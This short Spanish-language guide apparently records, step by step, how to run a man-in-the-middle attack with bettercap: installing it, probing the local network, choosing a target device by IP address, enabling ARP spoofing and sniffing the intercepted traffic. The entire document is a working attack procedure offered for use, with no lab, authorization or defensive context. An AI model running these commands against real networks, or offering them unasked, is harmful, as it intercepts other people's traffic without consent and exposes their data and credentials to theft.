Instalar el programa 

```
sudo apt install bettercap 
```

Iniciarlo
```
sudo bettercap
```

Iniciar Servicio
```
net.probe on
```

Ver Dispositivos 
```
net.show
```

Seleccionar Dispositivos 
```
set arp.spoof.target 192.168.1.34
```

Iniciar ARP
```
arp.spoof on
```

Iniciar Lectura
```
net.sniff on
```
